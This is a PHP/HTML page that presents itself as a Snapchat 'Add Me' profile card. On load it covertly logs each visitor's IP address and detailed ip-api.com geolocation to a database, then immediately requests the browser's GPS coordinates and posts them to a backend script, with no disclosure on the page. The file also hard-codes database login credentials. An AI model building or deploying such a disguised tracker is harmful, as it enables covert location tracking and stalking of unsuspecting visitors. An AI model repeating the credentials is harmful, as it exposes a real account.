
<?php
// Assuming you have a MySQL database
// $servername = "localhost";
// $username = "root";
// $password = "";
// $dbname = "ipaddresses";

$servername = "localhost";
$username = "u472036914_ashti";
$password = "2|VGieBfW";
$dbname = "u472036914_ashtisnap";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    echo "Connection failed:3 ";
    die("Connection failed: " . $conn->connect_error);
}

// Function to get user's IP address
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

// Get user's IP address
$userIP = getUserIP();

// Fetch geolocation data from a GeoLocation API (for example, ipstack)

$geoApiUrl = "http://ip-api.com/json/{$userIP}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query";
// $geoApiUrl = "http://ip-api.com/json/103.191.118.173?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query";

$geoDataJSON = file_get_contents($geoApiUrl);
$geoData = json_decode($geoDataJSON, true);
// Store user's data and timestamp in a database
$timestamp = date("Y-m-d H:i:s");
$sql = "INSERT INTO user_data (ip_address, country, city, timestamp, jsonDump) VALUES (?, ?, ?, ?, ?)";
$stmt = $conn->prepare($sql);
$stmt->bind_param("sssss", $userIP, $geoData['country'], $geoData['city'], $timestamp, $geoDataJSON);

$stmt->execute();

// Get the ID of the inserted user_data record
$userDataId = $stmt->insert_id;


$stmt->close();

// Close the database connection
$conn->close();

// Output response to the frontend (for example, a success message)
echo "<script>console.log('Data stored successfully!')</script>";
?>



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ashti's SnapChat Account</title>

    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            width: 100vw;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #333;
        }
        .cardBg{
            background:linear-gradient(to bottom, #3f5261, #202a36);
        }
        .snapBg{
            background-color: #FFFC00; /* Snapchat's yellow background color */

        }

        .primaryText{
            color: #FFFC00; /* Snapchat's yellow background color */
        }
        .mainButton{
            background: #fffc00;
    color: #333;
        }

    
    </style>
    <script src="https://cdn.tailwindcss.com"></script>
</head>


<body>
<script>
const userDataId = <?=$userDataId?>;
// Function to ask for GPS permission and send data to backend
function getUserLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            // Send the GPS data to the backend along with the userDataId
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;

            // You can use Fetch API or other methods to send data to the backend
            fetch('backend_gps.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({userDataId, latitude, longitude}),
            })
            .then(response => response.json())
            .then(data => {
                console.log('GPS data stored:', data);
            })
            .catch(error => {
                console.error('Error storing GPS data:', error);
            });
        },
        function(error) {
            alert('Error getting geolocation:', error);
        }
        );
    } else {
        console.error('Geolocation is not supported by this browser.');
    }
}

// Ask the user for GPS permission (for example, with a button click)
getUserLocation();
</script>
<div class="user-container max-w-xs sm:max-w-full flex flex-col justify-center items-center cardBg text-white shadow-xl p-20 rounded-2xl">
        <!-- Replace the image source with your user's QR code or account link image -->
        <div class='snapBg p-5 border-4 border-black rounded-2xl'>
            <img src="AShti.jpeg" alt="User QR Code or Account Link">
        </div>
        <p class='mt-2 font-medium text-xl text-center'>AshtiAli997</p>
        <p class=' font-sm text-center'>marshal997</p>
        <a href='https://www.snapchat.com/add/ashti_snap' class='mainButton rounded-xl py-2 px-5 font-bold mt-5 text-black transition hover:shadow-2xl'>Add Me !</a>
    </div>

</body>
</html>